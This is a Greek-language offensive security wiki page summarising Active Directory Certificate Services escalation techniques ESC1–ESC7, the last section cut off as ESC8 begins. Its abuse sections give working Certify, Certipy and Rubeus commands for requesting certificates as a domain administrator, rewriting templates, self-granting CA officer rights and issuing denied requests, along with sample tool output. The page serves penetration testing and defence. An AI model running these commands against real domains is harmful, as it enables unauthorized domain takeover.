# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Αυτή είναι μια περίληψη των τμημάτων τεχνικών κλιμάκωσης των αναρτήσεων:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **Τα δικαιώματα εγγραφής χορηγούνται σε χρήστες με χαμηλά προνόμια από την Enterprise CA.**
- **Η έγκριση του διευθυντή δεν απαιτείται.**
- **Δεν απαιτούνται υπογραφές από εξουσιοδοτημένο προσωπικό.**
- **Οι περιγραφείς ασφαλείας στα πρότυπα πιστοποιητικών είναι υπερβολικά επιτρεπτικοί, επιτρέποντας σε χρήστες με χαμηλά προνόμια να αποκτούν δικαιώματα εγγραφής.**
- **Τα πρότυπα πιστοποιητικών είναι ρυθμισμένα να ορίζουν EKUs που διευκολύνουν την αυθεντικοποίηση:**
- Τα αναγνωριστικά Extended Key Usage (EKU) όπως Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), ή χωρίς EKU (SubCA) περιλαμβάνονται.
- **Η δυνατότητα για τους αιτούντες να συμπεριλάβουν ένα subjectAltName στην Αίτηση Υπογραφής Πιστοποιητικού (CSR) επιτρέπεται από το πρότυπο:**
- Ο Active Directory (AD) δίνει προτεραιότητα στο subjectAltName (SAN) σε ένα πιστοποιητικό για την επαλήθευση ταυτότητας αν είναι παρόν. Αυτό σημαίνει ότι με την καθορισμένη SAN σε μια CSR, μπορεί να ζητηθεί ένα πιστοποιητικό για να προσποιηθεί οποιονδήποτε χρήστη (π.χ., έναν διαχειριστή τομέα). Εάν μπορεί να καθοριστεί μια SAN από τον αιτούντα υποδεικνύεται στο αντικείμενο AD του προτύπου πιστοποιητικού μέσω της ιδιότητας `mspki-certificate-name-flag`. Αυτή η ιδιότητα είναι ένα bitmask, και η παρουσία της σημαίας `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` επιτρέπει την καθορισμένη SAN από τον αιτούντα.

> [!CAUTION]
> Η ρύθμιση που περιγράφεται επιτρέπει σε χρήστες με χαμηλά προνόμια να ζητούν πιστοποιητικά με οποιαδήποτε SAN επιλέξουν, επιτρέποντας την αυθεντικοποίηση ως οποιοσδήποτε τομεακός κύριος μέσω Kerberos ή SChannel.

Αυτή η δυνατότητα ενεργοποιείται μερικές φορές για να υποστηρίξει τη δημιουργία HTTPS ή πιστοποιητικών φιλοξενίας κατά την εκτέλεση από προϊόντα ή υπηρεσίες ανάπτυξης, ή λόγω έλλειψης κατανόησης.

Σημειώνεται ότι η δημιουργία ενός πιστοποιητικού με αυτή την επιλογή ενεργοποιεί μια προειδοποίηση, κάτι που δεν συμβαίνει όταν ένα υπάρχον πρότυπο πιστοποιητικού (όπως το πρότυπο `WebServer`, το οποίο έχει ενεργοποιημένη την `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) αντιγράφεται και στη συνέχεια τροποποιείται για να περιλαμβάνει ένα OID αυθεντικοποίησης.

### Abuse

Για να **βρείτε ευάλωτα πρότυπα πιστοποιητικών** μπορείτε να εκτελέσετε:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Για να **καταχραστεί αυτή την ευπάθεια για να μιμηθεί έναν διαχειριστή** θα μπορούσε να εκτελέσει:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Στη συνέχεια, μπορείτε να μετατρέψετε το παραγόμενο **πιστοποιητικό σε μορφή `.pfx`** και να το χρησιμοποιήσετε για **αυθενication χρησιμοποιώντας Rubeus ή certipy** ξανά:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Τα Windows binaries "Certreq.exe" & "Certutil.exe" μπορούν να χρησιμοποιηθούν για τη δημιουργία του PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Η καταμέτρηση των προτύπων πιστοποιητικών εντός του σχήματος διαμόρφωσης του AD Forest, συγκεκριμένα εκείνων που δεν απαιτούν έγκριση ή υπογραφές, που διαθέτουν Client Authentication ή Smart Card Logon EKU, και με την ενεργοποιημένη σημαία `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, μπορεί να πραγματοποιηθεί εκτελώντας το ακόλουθο LDAP query:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

Το δεύτερο σενάριο κακοποίησης είναι μια παραλλαγή του πρώτου:

1. Τα δικαιώματα εγγραφής χορηγούνται σε χρήστες με χαμηλά προνόμια από την Enterprise CA.
2. Η απαίτηση για έγκριση από διευθυντή είναι απενεργοποιημένη.
3. Η ανάγκη για εξουσιοδοτημένες υπογραφές παραλείπεται.
4. Ένας υπερβολικά επιτρεπτικός περιγραφέας ασφαλείας στο πρότυπο πιστοποιητικού χορηγεί δικαιώματα εγγραφής πιστοποιητικού σε χρήστες με χαμηλά προνόμια.
5. **Το πρότυπο πιστοποιητικού ορίζεται να περιλαμβάνει το Any Purpose EKU ή κανένα EKU.**

Το **Any Purpose EKU** επιτρέπει σε έναν επιτιθέμενο να αποκτήσει ένα πιστοποιητικό για **οποιονδήποτε σκοπό**, συμπεριλαμβανομένης της πιστοποίησης πελάτη, της πιστοποίησης διακομιστή, της υπογραφής κώδικα κ.λπ. Η ίδια **τεχνική που χρησιμοποιείται για το ESC3** μπορεί να χρησιμοποιηθεί για την εκμετάλλευση αυτού του σεναρίου.

Πιστοποιητικά με **κανένα EKU**, που λειτουργούν ως υποκαταστάτες CA, μπορούν να εκμεταλλευτούν για **οποιονδήποτε σκοπό** και μπορούν **επίσης να χρησιμοποιηθούν για την υπογραφή νέων πιστοποιητικών**. Έτσι, ένας επιτιθέμενος θα μπορούσε να καθορίσει αυθαίρετα EKUs ή πεδία στα νέα πιστοποιητικά χρησιμοποιώντας ένα πιστοποιητικό υποκαταστάτη CA.

Ωστόσο, νέα πιστοποιητικά που δημιουργούνται για **πιστοποίηση τομέα** δεν θα λειτουργούν αν ο υποκαταστάτης CA δεν είναι αξιόπιστος από το **`NTAuthCertificates`** αντικείμενο, το οποίο είναι η προεπιλεγμένη ρύθμιση. Παρ' όλα αυτά, ένας επιτιθέμενος μπορεί να δημιουργήσει **νέα πιστοποιητικά με οποιοδήποτε EKU** και αυθαίρετες τιμές πιστοποιητικού. Αυτά θα μπορούσαν να **κακοποιηθούν** για μια ευρεία γκάμα σκοπών (π.χ., υπογραφή κώδικα, πιστοποίηση διακομιστή κ.λπ.) και θα μπορούσαν να έχουν σημαντικές επιπτώσεις για άλλες εφαρμογές στο δίκτυο όπως SAML, AD FS ή IPSec.

Για να απαριθμήσετε τα πρότυπα που ταιριάζουν σε αυτό το σενάριο εντός του σχήματος διαμόρφωσης του AD Forest, μπορεί να εκτελεστεί το εξής LDAP query:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

Αυτό το σενάριο είναι παρόμοιο με το πρώτο και το δεύτερο αλλά **καταχράται** μια **διαφορετική EKU** (Certificate Request Agent) και **2 διαφορετικά πρότυπα** (επομένως έχει 2 σύνολα απαιτήσεων),

Η **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), γνωστή ως **Enrollment Agent** στην τεκμηρίωση της Microsoft, επιτρέπει σε έναν κύριο να **εγγραφεί** για ένα **πιστοποιητικό** **εκ μέρους ενός άλλου χρήστη**.

Ο **“enrollment agent”** εγγράφεται σε ένα τέτοιο **πρότυπο** και χρησιμοποιεί το προκύπτον **πιστοποιητικό για να συνυπογράψει ένα CSR εκ μέρους του άλλου χρήστη**. Στη συνέχεια **στέλνει** το **συνυπογεγραμμένο CSR** στην CA, εγγραφόμενος σε ένα **πρότυπο** που **επιτρέπει “εγγραφή εκ μέρους του”**, και η CA απαντά με ένα **πιστοποιητικό που ανήκει στον “άλλο” χρήστη**.

**Requirements 1:**

- Τα δικαιώματα εγγραφής χορηγούνται σε χρήστες με χαμηλά προνόμια από την Enterprise CA.
- Η απαίτηση για έγκριση από διευθυντή παραλείπεται.
- Καμία απαίτηση για εξουσιοδοτημένες υπογραφές.
- Ο ασφάλειας περιγραφέας του προτύπου πιστοποιητικού είναι υπερβολικά επιτρεπτικός, χορηγώντας δικαιώματα εγγραφής σε χρήστες με χαμηλά προνόμια.
- Το πρότυπο πιστοποιητικού περιλαμβάνει την Certificate Request Agent EKU, επιτρέποντας την αίτηση άλλων προτύπων πιστοποιητικών εκ μέρους άλλων κύριων.

**Requirements 2:**

- Η Enterprise CA χορηγεί δικαιώματα εγγραφής σε χρήστες με χαμηλά προνόμια.
- Η έγκριση του διευθυντή παρακάμπτεται.
- Η έκδοση του σχήματος του προτύπου είναι είτε 1 είτε υπερβαίνει το 2, και καθορίζει μια Απαίτηση Πολιτικής Εφαρμογής που απαιτεί την Certificate Request Agent EKU.
- Μια EKU που ορίζεται στο πρότυπο πιστοποιητικού επιτρέπει την αυθεντικοποίηση τομέα.
- Περιορισμοί για τους πράκτορες εγγραφής δεν εφαρμόζονται στην CA.

### Abuse

Μπορείτε να χρησιμοποιήσετε [**Certify**](https://github.com/GhostPack/Certify) ή [**Certipy**](https://github.com/ly4k/Certipy) για να καταχραστείτε αυτό το σενάριο:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Οι **χρήστες** που επιτρέπεται να **αποκτούν** ένα **πιστοποιητικό εκπροσώπου εγγραφής**, τα πρότυπα στα οποία οι εκπρόσωποι εγγραφής **επιτρέπεται** να εγγραφούν, και οι **λογαριασμοί** εκ μέρους των οποίων μπορεί να ενεργήσει ο εκπρόσωπος εγγραφής μπορούν να περιοριστούν από τις επιχειρησιακές CA. Αυτό επιτυγχάνεται ανοίγοντας το `certsrc.msc` **snap-in**, **κλικάροντας με το δεξί κουμπί πάνω στην CA**, **επιλέγοντας Ιδιότητες**, και στη συνέχεια **μεταβαίνοντας** στην καρτέλα “Εκπρόσωποι Εγγραφής”.

Ωστόσο, σημειώνεται ότι η **προεπιλεγμένη** ρύθμιση για τις CA είναι να “**Μη περιορίζετε τους εκπροσώπους εγγραφής**.” Όταν η περιοριστική ρύθμιση για τους εκπροσώπους εγγραφής ενεργοποιείται από τους διαχειριστές, ρυθμίζοντας την σε “Περιορίστε τους εκπροσώπους εγγραφής,” η προεπιλεγμένη διαμόρφωση παραμένει εξαιρετικά επιτρεπτική. Επιτρέπει την πρόσβαση σε **Όλους** για να εγγραφούν σε όλα τα πρότυπα ως οποιοσδήποτε.

## Ευάλωτος Έλεγχος Πρόσβασης Πιστοποιητικού - ESC4

### **Εξήγηση**

Ο **ασφαλιστικός περιγραφέας** στα **πρότυπα πιστοποιητικών** καθορίζει τις **άδειες** που κατέχουν οι συγκεκριμένοι **AD principals** σχετικά με το πρότυπο.

Εάν ένας **επιτιθέμενος** κατέχει τις απαραίτητες **άδειες** για να **αλλάξει** ένα **πρότυπο** και να **θεσπίσει** οποιεσδήποτε **εκμεταλλεύσιμες κακοδιαμορφώσεις** που περιγράφονται σε **προηγούμενες ενότητες**, η κλιμάκωση προνομίων θα μπορούσε να διευκολυνθεί.

Σημαντικές άδειες που ισχύουν για τα πρότυπα πιστοποιητικών περιλαμβάνουν:

- **Ιδιοκτήτης:** Παρέχει έμμεσο έλεγχο επί του αντικειμένου, επιτρέποντας την τροποποίηση οποιωνδήποτε χαρακτηριστικών.
- **FullControl:** Ενεργοποιεί πλήρη εξουσία επί του αντικειμένου, συμπεριλαμβανομένης της ικανότητας να αλλάξει οποιαδήποτε χαρακτηριστικά.
- **WriteOwner:** Επιτρέπει την αλλαγή του ιδιοκτήτη του αντικειμένου σε έναν κύριο υπό τον έλεγχο του επιτιθέμενου.
- **WriteDacl:** Επιτρέπει την προσαρμογή των ελέγχων πρόσβασης, ενδεχομένως παρέχοντας σε έναν επιτιθέμενο FullControl.
- **WriteProperty:** Εξουσιοδοτεί την επεξεργασία οποιωνδήποτε ιδιοτήτων αντικειμένου.

### Κατάχρηση

Ένα παράδειγμα κλιμάκωσης προνομίων όπως το προηγούμενο:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

Το ESC4 είναι όταν ένας χρήστης έχει δικαιώματα εγγραφής σε ένα πρότυπο πιστοποιητικού. Αυτό μπορεί για παράδειγμα να καταχραστεί για να αντικαταστήσει τη διαμόρφωση του προτύπου πιστοποιητικού ώστε να καταστεί το πρότυπο ευάλωτο στο ESC1.

Όπως μπορούμε να δούμε στο παραπάνω μονοπάτι, μόνο ο `JOHNPC` έχει αυτά τα δικαιώματα, αλλά ο χρήστης μας `JOHN` έχει την νέα `AddKeyCredentialLink` άκρη προς τον `JOHNPC`. Δεδομένου ότι αυτή η τεχνική σχετίζεται με πιστοποιητικά, έχω εφαρμόσει αυτή την επίθεση επίσης, η οποία είναι γνωστή ως [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Ορίστε μια μικρή ματιά στην εντολή `shadow auto` του Certipy για να ανακτήσετε το NT hash του θύματος.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** μπορεί να αντικαταστήσει τη ρύθμιση ενός προτύπου πιστοποιητικού με μια μόνο εντολή. Από **προεπιλογή**, το Certipy θα **αντικαταστήσει** τη ρύθμιση για να την καταστήσει **ευάλωτη σε ESC1**. Μπορούμε επίσης να καθορίσουμε την **παράμετρο `-save-old` για να αποθηκεύσουμε την παλιά ρύθμιση**, η οποία θα είναι χρήσιμη για **την αποκατάσταση** της ρύθμισης μετά την επίθεσή μας.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Ευάλωτος Έλεγχος Πρόσβασης Αντικειμένων PKI - ESC5

### Εξήγηση

Το εκτενές δίκτυο αλληλοσυνδεδεμένων σχέσεων βασισμένων σε ACL, το οποίο περιλαμβάνει αρκετά αντικείμενα πέρα από τα πρότυπα πιστοποιητικών και την αρχή πιστοποίησης, μπορεί να επηρεάσει την ασφάλεια ολόκληρου του συστήματος AD CS. Αυτά τα αντικείμενα, που μπορούν να επηρεάσουν σημαντικά την ασφάλεια, περιλαμβάνουν:

- Το αντικείμενο υπολογιστή AD του διακομιστή CA, το οποίο μπορεί να παραβιαστεί μέσω μηχανισμών όπως το S4U2Self ή το S4U2Proxy.
- Ο διακομιστής RPC/DCOM του διακομιστή CA.
- Οποιοδήποτε κατώτερο αντικείμενο ή κοντέινερ AD εντός της συγκεκριμένης διαδρομής κοντέινερ `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Αυτή η διαδρομή περιλαμβάνει, αλλά δεν περιορίζεται σε, κοντέινερ και αντικείμενα όπως το κοντέινερ Πρότυπα Πιστοποιητικών, το κοντέινερ Αρχών Πιστοποίησης, το αντικείμενο NTAuthCertificates και το Κοντέινερ Υπηρεσιών Εγγραφής.

Η ασφάλεια του συστήματος PKI μπορεί να παραβιαστεί αν ένας επιτιθέμενος με χαμηλά προνόμια καταφέρει να αποκτήσει έλεγχο σε οποιοδήποτε από αυτά τα κρίσιμα στοιχεία.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Εξήγηση

Το θέμα που συζητείται στην [**ανάρτηση της CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) αναφέρεται επίσης στις επιπτώσεις της σημαίας **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, όπως περιγράφεται από τη Microsoft. Αυτή η ρύθμιση, όταν ενεργοποιείται σε μια Αρχή Πιστοποίησης (CA), επιτρέπει την προσθήκη **καθορισμένων από τον χρήστη τιμών** στο **εναλλακτικό όνομα υποκειμένου** για **οποιοδήποτε αίτημα**, συμπεριλαμβανομένων εκείνων που κατασκευάζονται από το Active Directory®. Ως εκ τούτου, αυτή η διάταξη επιτρέπει σε έναν **εισβολέα** να εγγραφεί μέσω **οποιουδήποτε προτύπου** έχει ρυθμιστεί για **αυθεντικοποίηση** τομέα—συγκεκριμένα εκείνων που είναι ανοιχτά για εγγραφή **μη προνομιούχων** χρηστών, όπως το πρότυπο Χρήστη. Ως αποτέλεσμα, μπορεί να εξασφαλιστεί ένα πιστοποιητικό, επιτρέποντας στον εισβολέα να αυθεντικοποιηθεί ως διαχειριστής τομέα ή **οποιαδήποτε άλλη ενεργή οντότητα** εντός του τομέα.

**Σημείωση**: Η προσέγγιση για την προσθήκη **εναλλακτικών ονομάτων** σε ένα Αίτημα Υπογραφής Πιστοποιητικού (CSR), μέσω του επιχειρήματος `-attrib "SAN:"` στο `certreq.exe` (αναφερόμενο ως “Ζεύγη Τιμών Ονομάτων”), παρουσιάζει μια **αντίθεση** με τη στρατηγική εκμετάλλευσης των SANs στο ESC1. Εδώ, η διάκριση έγκειται στο **πώς οι πληροφορίες λογαριασμού είναι ενσωματωμένες**—εντός ενός χαρακτηριστικού πιστοποιητικού, αντί για μια επέκταση.

### Κατάχρηση

Για να επαληθεύσουν αν η ρύθμιση είναι ενεργοποιημένη, οι οργανισμοί μπορούν να χρησιμοποιήσουν την παρακάτω εντολή με το `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Αυτή η λειτουργία ουσιαστικά χρησιμοποιεί **remote registry access**, επομένως, μια εναλλακτική προσέγγιση θα μπορούσε να είναι:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Εργαλεία όπως [**Certify**](https://github.com/GhostPack/Certify) και [**Certipy**](https://github.com/ly4k/Certipy) είναι ικανά να ανιχνεύσουν αυτή τη λανθασμένη ρύθμιση και να την εκμεταλλευτούν:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Για να αλλάξετε αυτές τις ρυθμίσεις, υποθέτοντας ότι διαθέτετε **δικαιώματα διαχειριστή τομέα** ή ισοδύναμα, η ακόλουθη εντολή μπορεί να εκτελεστεί από οποιονδήποτε σταθμό εργασίας:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Για να απενεργοποιήσετε αυτή τη ρύθμιση στο περιβάλλον σας, η σημαία μπορεί να αφαιρεθεί με:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Μετά τις ενημερώσεις ασφαλείας του Μαΐου 2022, οι νεοεκδοθείσες **πιστοποιήσεις** θα περιέχουν μια **επέκταση ασφαλείας** που ενσωματώνει την **ιδιότητα `objectSid` του αιτούντος**. Για το ESC1, αυτό το SID προέρχεται από το καθορισμένο SAN. Ωστόσο, για το **ESC6**, το SID αντικατοπτρίζει το **`objectSid` του αιτούντος**, όχι το SAN.\
> Για να εκμεταλλευτεί κανείς το ESC6, είναι απαραίτητο το σύστημα να είναι ευάλωτο στο ESC10 (Αδύνατοι Χάρτες Πιστοποιητικών), το οποίο δίνει προτεραιότητα στο **SAN έναντι της νέας επέκτασης ασφαλείας**.

## Ευάλωτος Έλεγχος Πρόσβασης Αρχής Πιστοποίησης - ESC7

### Επίθεση 1

#### Εξήγηση

Ο έλεγχος πρόσβασης για μια αρχή πιστοποίησης διατηρείται μέσω ενός συνόλου δικαιωμάτων που διέπουν τις ενέργειες της CA. Αυτά τα δικαιώματα μπορούν να προβληθούν με την πρόσβαση στο `certsrv.msc`, κάνοντας δεξί κλικ σε μια CA, επιλέγοντας ιδιότητες και στη συνέχεια πηγαίνοντας στην καρτέλα Ασφάλεια. Επιπλέον, τα δικαιώματα μπορούν να απαριθμηθούν χρησιμοποιώντας το PSPKI module με εντολές όπως:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Αυτό παρέχει πληροφορίες σχετικά με τα κύρια δικαιώματα, δηλαδή **`ManageCA`** και **`ManageCertificates`**, που σχετίζονται με τους ρόλους του “CA administrator” και “Certificate Manager” αντίστοιχα.

#### Κατάχρηση

Η κατοχή δικαιωμάτων **`ManageCA`** σε μια αρχή πιστοποίησης επιτρέπει στον κύριο να χειρίζεται ρυθμίσεις απομακρυσμένα χρησιμοποιώντας το PSPKI. Αυτό περιλαμβάνει την εναλλαγή της σημαίας **`EDITF_ATTRIBUTESUBJECTALTNAME2`** για να επιτραπεί η καθορισμός SAN σε οποιοδήποτε πρότυπο, μια κρίσιμη πτυχή της κλιμάκωσης τομέα.

Η απλοποίηση αυτής της διαδικασίας είναι εφικτή μέσω της χρήσης του cmdlet **Enable-PolicyModuleFlag** του PSPKI, επιτρέποντας τροποποιήσεις χωρίς άμεση αλληλεπίδραση με το GUI.

Η κατοχή δικαιωμάτων **`ManageCertificates`** διευκολύνει την έγκριση εκκρεμών αιτημάτων, παρακάμπτοντας αποτελεσματικά την προστασία "έγκριση διαχειριστή πιστοποιητικού CA".

Μια συνδυασμένη χρήση των μονάδων **Certify** και **PSPKI** μπορεί να χρησιμοποιηθεί για να ζητήσει, να εγκρίνει και να κατεβάσει ένα πιστοποιητικό:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> Στην **προηγούμενη επίθεση** οι άδειες **`Manage CA`** χρησιμοποιήθηκαν για να **ενεργοποιηθεί** η σημαία **EDITF_ATTRIBUTESUBJECTALTNAME2** για να εκτελεστεί η **ESC6 επίθεση**, αλλά αυτό δεν θα έχει καμία επίδραση μέχρι να επανεκκινηθεί η υπηρεσία CA (`CertSvc`). Όταν ένας χρήστης έχει το δικαίωμα πρόσβασης **`Manage CA`**, επιτρέπεται επίσης να **επανεκκινήσει την υπηρεσία**. Ωστόσο, **δεν σημαίνει ότι ο χρήστης μπορεί να επανεκκινήσει την υπηρεσία απομακρυσμένα**. Επιπλέον, η **ESC6 μπορεί να μην λειτουργεί κατευθείαν** σε πολλές περιβαλλοντικές εγκαταστάσεις που έχουν διορθωθεί λόγω των ενημερώσεων ασφαλείας του Μαΐου 2022.

Επομένως, μια άλλη επίθεση παρουσιάζεται εδώ.

Perquisites:

- Μόνο **`ManageCA` permission**
- **`Manage Certificates`** permission (μπορεί να παραχωρηθεί από **`ManageCA`**)
- Το πρότυπο πιστοποιητικού **`SubCA`** πρέπει να είναι **ενεργοποιημένο** (μπορεί να ενεργοποιηθεί από **`ManageCA`**)

Η τεχνική βασίζεται στο γεγονός ότι οι χρήστες με το δικαίωμα πρόσβασης **`Manage CA`** _και_ **`Manage Certificates`** μπορούν να **εκδίδουν αποτυχημένα αιτήματα πιστοποιητικών**. Το πρότυπο πιστοποιητικού **`SubCA`** είναι **ευάλωτο στην ESC1**, αλλά **μόνο οι διαχειριστές** μπορούν να εγγραφούν στο πρότυπο. Έτσι, ένας **χρήστης** μπορεί να **ζητήσει** να εγγραφεί στο **`SubCA`** - το οποίο θα **αρνηθεί** - αλλά **στη συνέχεια θα εκδοθεί από τον διαχειριστή αργότερα**.

#### Abuse

Μπορείτε να **παραχωρήσετε στον εαυτό σας το δικαίωμα πρόσβασης `Manage Certificates`** προσθέτοντας τον χρήστη σας ως νέο αξιωματούχο.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Το **`SubCA`** πρότυπο μπορεί να **ενεργοποιηθεί στην CA** με την παράμετρο `-enable-template`. Από προεπιλογή, το πρότυπο `SubCA` είναι ενεργοποιημένο.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Αν έχουμε εκπληρώσει τις προϋποθέσεις για αυτή την επίθεση, μπορούμε να ξεκινήσουμε **ζητώντας ένα πιστοποιητικό βασισμένο στο πρότυπο `SubCA`**.

**Αυτή η αίτηση θα απορριφθεί**, αλλά θα αποθηκεύσουμε το ιδιωτικό κλειδί και θα σημειώσουμε το ID της αίτησης.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Με τα **`Manage CA` και `Manage Certificates`**, μπορούμε στη συνέχεια να **εκδώσουμε το αποτυχημένο αίτημα πιστοποίησης** με την εντολή `ca` και την παράμετρο `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Και τελικά, μπορούμε να **ανακτήσουμε το εκδοθέν πιστοποιητικό** με την εντολή `req` και την παράμετρο `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Εξήγηση

> [!NOTE]
> Σε περιβάλλοντα όπου **έχει εγκατασταθεί το AD CS**, αν υπάρχει τουλάχιστον ένα **ευάλωτο σημείο εγγραφής ιστού** και τουλάχιστον ένα **πρότυπο πιστοποιητικού έχει δημοσιευθεί** που επιτρέπει **την εγγραφή υπολογιστών τομέα και την πιστοποίηση πελατών** (όπως το προεπιλεγμένο **`Machine`** πρότυπο), είναι δυνατή η **κατάληψη οποιουδήποτε υπολογιστή με ενεργή την υπηρεσία spooler από έναν επιτιθέμενο**!

